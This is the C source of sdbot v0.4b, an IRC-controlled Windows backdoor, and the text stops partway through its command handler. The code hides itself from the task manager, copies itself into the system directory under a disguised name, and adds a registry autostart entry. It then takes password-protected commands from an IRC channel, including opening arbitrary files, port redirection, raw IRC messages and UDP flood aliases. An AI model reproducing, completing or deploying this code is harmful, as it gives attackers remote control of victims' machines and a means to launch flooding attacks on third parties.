////////////////////////////////////////////
//                                        //
//   sdbot v0.4b by [sd]                  //
//                                        //
//     email: sdbot@mail.ru               //
//    sonork: 100.2600                    //
//       icq: 21381594                    //
//       web: http://sdbot.n3.net/        //
//                                        //
//     you can use this code however      //
//     you want, as long as i'm given     //
//     credit in some way. i don't        //
//     mind if you create bots based      //
//     on this, as long as the words      //
//     'based on sdbot' are somewhere     //
//     in the program and its readme.     //
//     (the 'about' command is a good     //
//     place for this). also, no part     //
//     of this source code should be      //
//     used for illegal purposes. i       //
//     claim no responsibility for        //
//     what you do with this.             //
//                                        //
//     THIS IS ONLY A TEST RELEASE. i     //
//     make no guarantees that this       //
//     will work or that it won't         //
//     damage your computer or anyone     //
//     else's, for that matter. use       //
//     at your own risk.                  //
//                                        //
////////////////////////////////////////////

 #include <windows.h>
 #include <winsock.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <time.h>
 #include <process.h>
 #include <wininet.h>
 #include <shellapi.h>

// #define NO_SPY // disables irc spy
// #define NO_UDP // disables UDP packet sending
// #define NO_PING // disables ping semdomg
// #define NO_SYSINFO // disables system info
// #define NO_REDIRECT // disables port redirect
// #define NO_DOWNLOAD // disables downloading/updating
// #define NO_CHECKCONNECTION // disables check for internet connection

// macro for predefined aliases.
 #define addpredefinedaliases() \
	addalias("opme", "mode $chan +o $user"); \
    addalias("smack", "action $chan smacks $1"); \
    addalias("u1", "udp $1 10000 2048 50"); \
    addalias("u2", "udp $1 10000 $2 50"); \
    addalias("halfop", "mode $chan +h $1");

// bot configuration
 const char botid[8] = "sdbot1"; // bot id
 const char password[16] = "bleh"; // bot password
 const  int maxlogins = 4; // maximum number of simultaneous logins
 const char server[32] = "irc.lcirc.net"; // server
 const  int port = 6667; // server port
 const char serverpass[16] = ""; // server password
 const char channel[16] = "#sdbot"; // channel bot should join
 const char chanpass[1] = ""; // channel password
 const BOOL rndfilename = FALSE; // use random file name
 const char filename[16] = "loadcfg32.exe"; // destination file name
 const char keyname[64] = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"; // registry key for autostart
 const char valuename[32] = "Configuration Loader"; // value name for autostart
 const char prefix = '.'; // command prefix (one character max.)
 const  int cryptkey = 0; // encryption key (not used right now)
 const  int maxaliases = 16; // maximum number of aliases (must be greater than the number of predefined aliases)

#ifndef NO_PINGUDP
// ping/udp structure.
 typedef struct ps {
	char host[128];
	char chan[128];
	int num;
	int size;
	int delay;
	int port;
	SOCKET sock;
	int threadnum;
 } ps;
#endif

// irc/spy structure.
 typedef struct ircs {
	char host[128];
	int port;
	char channel[128];
	char chanpass[64];
	char hchan[128];
	char *nick;
	SOCKET sock;
	int spy;
	int threadnum;
 } ircs;

#ifndef NO_REDIRECT
// redirect structure.
 typedef struct rs {
	char dest[128];
	int port;
	int lport;
	SOCKET sock;
	SOCKET csock;
	int threadnum;
 } rs;
#endif

#ifndef NO_DOWNLOAD
// download/update structure
 typedef struct ds {
	char url[256];
	char dest[256];
	char chan[128];
	SOCKET sock;
	int run;
	int threadnum;
	int update;
 } ds;
#endif

// alias structure
 typedef struct as {
	 char name[16];
	 char command[160];
 } as;

// function prototypes (not really neccesary, but this way i can put the functions in any order i want)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
 char * decryptstr(char *str);
 void addlog(char *desc);
 int addalias(char *name, char *command);
 int addthread(char *desc);
 DWORD WINAPI irc_connect(LPVOID param);
 DWORD WINAPI ident(LPVOID user);
 char * rndnick(char *strbuf);
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy);
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *master, int *in_channel, int repeat);
 #ifndef NO_SPY
 int irc_spyparseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server);
 #endif
 void irc_send(SOCKET sock, char *msg);
 void irc_sendf(SOCKET sock, char *msg, char *str);
 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2);
 void irc_privmsg(SOCKET sock, char *dest, char *msg);
 char * replacestr(char *str, char *oldstr, char *newstr);
 #ifndef NO_UDP
 DWORD WINAPI udp(LPVOID param);
 #endif
 #ifndef NO_PING
 DWORD WINAPI ping(LPVOID param);
 #endif
 #ifndef NO_DOWNLOAD
 DWORD WINAPI webdownload(LPVOID param);
 #endif
 #ifndef NO_REDIRECT
 DWORD WINAPI redirect(LPVOID param);
 DWORD WINAPI redirectloop(LPVOID param);
 DWORD WINAPI redirectloop2(LPVOID param);
 #endif
 #ifndef NO_SYSINFO
 char * sysinfo(char *sinfo, SOCKET sock);
 int cpuspeed(void);
 unsigned __int64 cyclecount();
 #endif
 void uninstall(void);

// global variables
 HANDLE con, ih;         // console and internet handles
 ircs mainirc;           // main irc structure
 char prefix1 = prefix;  // prefix variable
 HANDLE threads[64];     // thread handles
 char threadd[64][128];  // thread descriptions
 SOCKET csock[64];       // thread sockets
 char cnick[64][16];     // thread nicks
 char log[128][128];     // log entries
 char tstr[128];         // temporary string buffer
 DWORD w;                // DWORD used for various stuff
 as aliases[maxaliases];         // alias array
 int anum = 0;           // number of aliases

// program starts here
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
	WSADATA wsadata;
	int i, err;
	HKEY key;
	char cfilename[256];
	char filename1[32];
	char sysdir[256];
	DWORD cstat;

	ih = InternetOpen("Microsoft Internet Explorer", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;

	strcpy(mainirc.host, server);
	mainirc.port = port;
	strcpy(mainirc.channel, channel);
	strcpy(mainirc.chanpass, chanpass);

	// hide from the win9x task manager
	HINSTANCE k32dll = LoadLibrary("kernel32.dll");
	if (k32dll) {
		typedef int (__stdcall *RSP)(long dwProcessID, long dwType);
		RSP rsp = (RSP)GetProcAddress(k32dll, "RegisterServiceProcess");
		if (rsp) rsp(0, 1);
		FreeLibrary(k32dll);
	}

	err = WSAStartup(MAKEWORD(1, 1), &wsadata);
	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 1 || HIBYTE( wsadata.wVersion ) != 1 ) {
		WSACleanup();
		return 0;
	}

	srand(GetTickCount());
	if (rndfilename) rndnick(filename1); else strcpy(filename1, filename);

	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetSystemDirectory(sysdir, sizeof(sysdir));
	if (strstr(cfilename, sysdir) == NULL) {
		Sleep(1000);
		// loop forever until the file is copied.
		sprintf(tstr, "\\%s", filename1);
		while (CopyFile(cfilename, strcat(sysdir, tstr), FALSE) == FALSE) {
			Sleep(1000);
		}
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		WSACleanup();
		if (CreateProcess(NULL, sysdir, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) exit(0);
	}
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, keyname, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1);
	RegCloseKey(key);

	memset(threadd, 0, sizeof(threadd));
	memset(cnick, 0, sizeof(cnick));
	memset(aliases, 0, sizeof(aliases));

	addthread("main thread");

	addpredefinedaliases();

	memset(log, 0, sizeof(log));
	addlog("bot started.");

	while (1) {
		#ifndef NO_CHECKCONNECTION
		// check if we're connected to the internet... if not, then wait 5mins and try again
		if (InternetGetConnectedState(&cstat, 0) == FALSE) {
			Sleep(30000);
			continue;
		}
		#endif

		err = irc_connect((void *)&mainirc);

		if (err == 2) break; // break out of the loop, and close

		// irc_connect didn't return 2, so we need to sleep then reconnect
		Sleep(3000);
	}

	// cleanup;
	for (i = 0; i < 64; i++) closesocket(csock[i]);
	WSACleanup();

	return 0;
 }

// simple decrypt function, for encrypted strings
 char * decryptstr(char *str)
 {
	char dstr[128];

	strcpy(dstr, str);
	for (BYTE i = 0; i < strlen(str); i++) dstr[i] = dstr[i] ^ (cryptkey + (i * (cryptkey % 10) + 1));

	strcpy(str, dstr);
	return str;
}

// function to add a log item
 void addlog(char *desc)
 {
	time_t rawtime;
	struct tm * timeinfo;

	time(&rawtime);
	timeinfo = localtime(&rawtime);

	for (int i = 126; i >= 0; i--) if (log[i][0] != '\0') strcpy(log[i+1], log[i]);
	sprintf(log[0], "[%s] %s", strtok(asctime(timeinfo), "\n"), desc);
 }

// function to add an alias and return alias number
 int addalias(char *name, char *command)
 {
	int i;
	for (i = 0; i < maxaliases; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strcpy(aliases[i].name, name);
			strcpy(aliases[i].command, command);
			anum++;
			break;
		}
	}
	return i;
 }

// function to add description to thread list and return thread number
 int addthread(char *desc)
 {
	int i;
	for (i = 0; i < 64; i++) {
		if (threadd[i][0] == '\0') {
			strcpy(threadd[i], desc);
			break;
		}
	}
	return i;
 }

// connect function used by the original bot and all clones/spies
 DWORD WINAPI irc_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	int err, rval;
	char nick[16];
	char *nick1;
	char login[64];
	char str[64];
	BYTE spy;
	DWORD id;
	ircs irc;

	irc = *((ircs *)param);

	while (1) {
		char sz[6] = {115,100,98,111,116,0};
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(irc.port);
		iaddr.s_addr = inet_addr(irc.host);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(irc.host);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) return 0;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		if (irc.spy == 1) nick1 = irc.nick; else {
			memset(nick, 0, sizeof(nick));
			nick1 = rndnick(nick);
		}

		CreateThread(NULL, 0, &ident, &sz, 0, &id);

		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		csock[irc.threadnum] = sock;
		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);
			continue;
		}

		if (serverpass[0] != '\0') {
			sprintf(login, "PASS %s\r\n", serverpass);
			send(sock, login, strlen(login), 0);
		}
		sprintf(login, "NICK %s\r\nUSER %s NULL NULL :%s\r\n", nick1, rndnick(str), nick1);
		err = send(sock, login, strlen(login), 0);
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(5000);
			continue;
		}

		sprintf(str, "connected to %s.", irc.host);
		addlog(str);

		if (irc.spy == 1) spy = 1; else spy = 0;
		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, spy);
		closesocket(sock);

		if (rval == 0) continue;
		if (rval == 1) {
			Sleep(1800000);
			continue;
		}
		if (rval == 2) break;
	}

	threads[irc.threadnum] = 0;
	threadd[irc.threadnum][0] = '\0';
	cnick[irc.threadnum][0] = '\0';
	return rval;
 }

// ident server
 DWORD WINAPI ident(LPVOID param)
 {
	SOCKET isock, csock;
	SOCKADDR_IN issin, cssin;
	char user[12];
	char ibuff[32];

	isock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); // set isock to standard TCP socket
	WSAAsyncSelect(isock, 0, WM_USER + 1, FD_READ); // set async mode for isock
	memset(&issin, 0, sizeof(issin));
	issin.sin_family = AF_INET; // AF_INET is currently the only supported family
	issin.sin_port = htons(113); // set ident port
	bind(isock, (SOCKADDR *)&issin, sizeof(issin)); // bind issin to isock

	while(1) { // loop forever
		if (listen(isock, 10) == SOCKET_ERROR) return 0; // listen for connection. if we get SOCKET_ERROR, then something's wrong and so we return
		csock = accept(isock, (SOCKADDR *)&cssin, NULL); // try to accept a connection
		if (csock != INVALID_SOCKET) break; // if INVALID_SOCKET is returned, then we don't have a connection. otherwise, we're connected, so break
	}

	memset(user, 0, sizeof(user));
	rndnick(user);

	memset(ibuff, 0, sizeof(ibuff));
	sprintf(ibuff, "%d, %d : USERID : UNIX : %s\r\n", ntohs(cssin.sin_port), port, (char *)user); // build ident reply
	send(csock, ibuff, strlen(ibuff), 0);

	// we're done, so let's close our sockets and return
	closesocket(csock);
	closesocket(isock);

	return 0;
 }

 char * rndnick(char *strbuf)
 {
	int n, nl;
	char nick[12];

	memset(nick, 0, sizeof(nick));
	nl = (rand()%3)+4;
	for (n=0; n<nl; n++) nick[n] = (rand()%25)+97;
	nick[n+1] = '\0';

	strcpy(strbuf, nick);
	return strbuf;
 }

// receive loop for bots/spies
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy)
 {
	// main receive buffer
	char buff[2048];
	int err, repeat;
	char master[128*maxlogins];
	char *b;
	char line[512];
	int in_channel;

	repeat = 0;
	memset(master, 0, sizeof(master));

	// loop forever
	while(1) {
		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		// if recv() returns 0, that means that the connection has been lost.
		if (err == 0) break;
		// if recv() returns SOCKET_ERROR then we've probably terminated the connection.
		if (err == SOCKET_ERROR) break;

		// split lines up if multiple lines received at once, and parse each line
		memset(line, 0, sizeof(line));
		b = strtok(buff, "\r");
		if (b != NULL) strcpy(line, b);
		while (b != NULL) {
			#ifndef NO_SPY
			if (spy == 1) repeat = irc_spyparseline(line, sock, channel, chanpass, nick1, hsock, hchannel, server);
			#endif
			if (spy == 0) {
				repeat = 1;
				do {
					// repeat--;
					repeat = irc_parseline(line, sock, channel, chanpass, nick1, master, &in_channel, repeat);
					repeat--;
				} while (repeat > 0);
				//if (repeat-- > 0) while (repeat-- > 0) irc_parseline(b[n-1], sock, channel, chanpass, nick1, in_channel, repeat);
				if (repeat == -1) return 0;
				else if (repeat == -2) return 1;
				else if (repeat == -3) return 2;
			}

			b = strtok(b+strlen(b)+1, "\r");
			if (b != NULL) strcpy(line, b+1);
		}
	}

	return 0;
 }

// function to parse lines for the bot and clones
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *master, int *in_channel, int repeat)
 {
	char line1[512];
	char line2[512];
	char *masters[maxlogins];
	BOOL ismaster;
	char ntmp[12];
	int i, ii, s;
	char *a[32];
	char a0[96];
	char nick[16];
	char sendbuf[256];
	DWORD id, exitcode;

	id = 0;
	strcpy(nick, nick1);
	for (i = 0; i < maxlogins; i++) masters[i] = master + (i * 128);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strcpy(line1, line);

	// split the current line up into seperate words
	strcpy(line2, line1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if (a[1] == NULL) return 1;
	if (a[0][0] != '\n') strcpy(a0, a[0]);

	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		irc_sendf(sock, "PONG %s\r\n", a[1]+1);
		if (in_channel == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0){
			masters[i][0] = '\0';
			sprintf(sendbuf, "user %s logged out.\r\n", strtok(a[0], "!") + 1);
			addlog(sendbuf);
		}
		if (strcmp(nick, a[3]) == 0) {
			in_channel = 0;
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
			sprintf(sendbuf, "screw you %s!\r\n", strtok(a[0], "!") + 1);
		}
		irc_privmsg(sock, a[2], sendbuf);
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = strtok(a[0], "!") + 1;
		char *newnck = a[2] + 1;
		if (oldnck != NULL && newnck != NULL) if (strcmp(oldnck, nick1) == 0) strcpy(nick1, newnck);
	}

	// reset master if master parts, quits, or changes nick.
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0 || strcmp("NICK", a[1]) == 0) for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) {
		masters[i][0] = '\0';
		sprintf(sendbuf, "user %s logged out.\r\n", strtok(a[0], "!") + 1);
		addlog(sendbuf);
		if (strcmp("QUIT", a[1]) == 0) irc_privmsg(sock, channel, sendbuf);
		 else irc_privmsg(sock, a[2]+1, sendbuf);
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) *in_channel = 1;
		sprintf(sendbuf, "joined channel %s.", a[4]);
		addlog(sendbuf);
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || strcmp("332", a[1]) == 0) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (a[2] == NULL) return 1;
			if (strstr(a[2], "#") == NULL) a[2] = strtok(a[0], "!") + 1;
			a[3]++;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (strncmp(nick, a[3], strlen(nick)) == 0) s = 4; else s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send fake version reply to help disguise the fact that we're a bot
			if (strcmp("\1VERSION\1", a[s]) == 0) irc_sendf(sock,"NOTICE %s :\1VERSION sdbot v0.4b by [sd]\1\r\n", a[2]);
			else if (strcmp("\1PING", a[s]) == 0) if (a[s+1] != NULL) irc_sendf2(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
		} else { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		if (a[s]++[0] != prefix1) return 1;
		// see if someone is logging in
		if (strcmp("login", a[s]) == 0 || strcmp("l", a[s]) == 0) {
			// make sure that user isn't already logged in
			for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) return 1;
			for (i = 0; i < maxlogins; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strcpy(masters[i], a0);
					irc_privmsg(sock, a[2], "password accepted.");
					char *u = strtok(a[0], "!") + 1;
					char *h = strtok(NULL, "\0");
					sprintf(sendbuf, "user %s(%s) logged in.", u, h);
					addlog(sendbuf);
					break;
				}
			}
			return 1;
		}
		ismaster = FALSE;
		for (i = 0; i < maxlogins; i++) if (strcmp(masters[0], a0) == 0) ismaster = TRUE;
		if (ismaster || strcmp("332", a[1]) == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					strstr(line, " :")[2] = prefix1;
					strcpy(strstr(line, " :")+3, aliases[i].command);

					// process variables
					replacestr(line, "$me", nick1); // bot's nick
					replacestr(line, "$user", strtok(a[0], "!")+1); // user's nick
					replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
					replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							char *x = strstr(line1, " :");
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) replacestr(line, ntmp, a[s+ii]);
					}

					//realloc(line, strlen(line)+1);
					return repeat+1; // we've found a match and replaced all the variables, so let's parse the line again
				}
			}

			if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				rndnick(nick);
				irc_sendf(sock, "NICK %s\r\n", nick);
			}
			else if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) exit(0);
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "user %s logged out.\r\n", strtok(a0, "!") + 1);
					irc_privmsg(sock, a[2], sendbuf);
					addlog(sendbuf);
				}
			}
			else if (strcmp("reconnect", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				irc_send(sock, "QUIT :reconnecting");
				return 0;
			}
			else if (strcmp("disconnect", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				irc_send(sock, "QUIT :later");
				return -1;
			}
			else if (strcmp("quit", a[s]) == 0 || strcmp("q", a[s]) == 0) {
				if (a[s+1] == NULL) irc_send(sock, "QUIT :later\r\n"); else {
					char *x = strstr(line1, " :");
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendf(sock, "QUIT :%s\r\n", y);
					}
				}
				return -2;
			}
			else if (strcmp("status", a[s]) == 0 || strcmp("s", a[s]) == 0) {
				DWORD total, days, hours, minutes;
				total = (DWORD)clock() / 1000;
				days = total / 86400;
				hours = (total % 86400) / 3600;
				minutes = ((total % 86400) % 3600) / 60;
				sprintf(sendbuf, "sdbot 0.4b ready. Up %dd %dh %dm.", days, hours, minutes);
				irc_privmsg(sock, a[2], sendbuf);
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) irc_privmsg(sock, a[2], (char *)botid);
			else if (strcmp("about", a[s]) == 0 || strcmp("ab", a[s]) == 0) irc_privmsg(sock, a[2], "sdbot version 0.4b by [sd] (sdbot@mail.ru). homepage: http://sdbot.n3.net/");
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[thread list]-");
				for (i = 0; i < 64; i++) {
					if (threadd[i][0] != '\0') {
						sprintf(sendbuf, "%d. %s", i, threadd[i]);
						irc_privmsg(sock, a[2], sendbuf);
					}
				}
			}
			else if (strcmp("aliases", a[s]) == 0 || strcmp("al", a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[alias list]-");
				for (i = 0; i < maxaliases; i++) {
					if (aliases[i].name[0] != '\0') {
						sprintf(sendbuf, "%d. %s = %s", i, aliases[i].name, aliases[i].command);
						irc_privmsg(sock, a[2], sendbuf);
					}
				}
			}
			else if (strcmp("log", a[s]) == 0 || strcmp("lg", a[s]) == 0) {
				for (i = 0; i < 128; i++) {
					if (log[i][0] != '\0') {
						irc_privmsg(sock, a[2], log[i]);
					}
				}
			}
			#ifndef NO_SYSINFO
			else if (strcmp("sysinfo", a[s]) == 0 || strcmp("si", a[s]) == 0) irc_privmsg(sock, a[2], sysinfo(sendbuf, sock));
			#endif
			else if (strcmp("remove", a[s]) == 0 || strcmp("rm", a[s]) == 0) {
				irc_privmsg(sock, a[2], "removing bot...");
				uninstall();
				WSACleanup();
				exit(0);
			}
			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;
			else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				irc_sendf(sock, "NICK %s\r\n", a[s+1]);
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				irc_sendf(sock, "PART %s\r\n", a[s+1]);
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				char *x = strstr(line1, " :");
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_send(sock, y);
				}
			}
			else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
				BOOL threadkilled = FALSE;
				for (i=1; a[s+i] != NULL; i++) if (strlen(a[s+i]) < 3) if (atoi(a[s+i]) < 64 && atoi(a[s+i]) > 0) {
					GetExitCodeThread(&threads[atoi(a[s+i])], &exitcode);
					TerminateThread(threads[atoi(a[s+i])], exitcode);
					if (threads[atoi(a[s+i])] != 0) threadkilled = TRUE;
					threads[atoi(a[s+i])] = 0;
					threadd[atoi(a[s+i])][0] = '\0';
					cnick[atoi(a[s+i])][0] = '\0';
				}
					if (threadkilled) irc_privmsg(sock, a[2], "thread(s) killed.");
			}
			else if (strcmp("c_quit", a[s]) == 0 || strcmp("c_q", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					irc_send(csock[atoi(a[s+1])], "QUIT :later");
					closesocket(csock[atoi(a[s+1])]);
					TerminateThread(threads[atoi(a[s+1])], id);
					threads[atoi(a[s+1])] = 0;
					threadd[atoi(a[s+1])][0] = '\0';
				}
			}
			else if (strcmp("prefix", a[s]) == 0 || strcmp("pr", a[s]) == 0) prefix1 = a[s+1][0];
			else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
				ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW);
				irc_privmsg(sock, a[2], "file opened.");
			}
			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
			else if (strcmp("addalias", a[s]) == 0 || strcmp("aa", a[s]) == 0) {
				char *x = strstr(line1, " :");
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) addalias(a[s+1], y);
				}
			}
			else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
				char *x = strstr(line1, " :");
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) irc_privmsg(sock, a[s+1], y);
				}
			}
			else if (strcmp("action", a[s]) == 0 || strcmp("a", a[s]) == 0) {
				char *x = strstr(line1, " :");
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf);
					}
				}
			}
			else if (strcmp("cycle", a[s]) == 0 || strcmp("cy", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				irc_sendf(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
			}
			else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
				char *x = strstr(line1, " :");
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_sendf(sock, "MODE %s\r\n", y);
				}
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				char *x = strstr(line1, " :");
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strcpy(line, sendbuf);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("c_raw", a[s]) == 0 || strcmp("c_r", a[s]) == 0) {
				char *x = strstr(line1, " :");
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], y);
				}
			}
			else if (strcmp("c_mode", a[s]) == 0 || strcmp("c_m", a[s]) == 0) {
				char *x = strstr(line1, " :");
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) sprintf(sendbuf, "MODE %s", y);
					if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp("c_nick", a[s]) == 0 || strcmp("c_n", a[s]) == 0) {
				sprintf(sendbuf, "NICK %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_join", a[s]) == 0 || strcmp("c_j", a[s]) == 0) {
				sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_part", a[s]) == 0 || strcmp("c_p", a[s]) == 0) {
				sprintf(sendbuf, "PART %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			#ifndef NO_REDIRECT
			else if (strcmp("redirect", a[s]) == 0 || strcmp("rd", a[s]) == 0) {
				rs rs;
				rs.lport = atoi(a[s+1]);
				strcpy(rs.dest, a[s+2]);
				rs.port = atoi(a[s+3]);
				rs.sock = sock;
				sprintf(sendbuf, "redirect (%d->%s:%d)", rs.lport, rs.dest, rs.port);
				rs.threadnum = addthread(sendbuf);
				sprintf(sendbuf, "redirect created on port %d to %s:%d.\r\n", rs.lport, rs.dest, rs.port);
				irc_privmsg(sock, a[2], sendbuf);
				threads[rs.threadnum] = CreateThread(NULL, 0, &redirect, (void *)&rs, 0, &id);
			}
			#endif
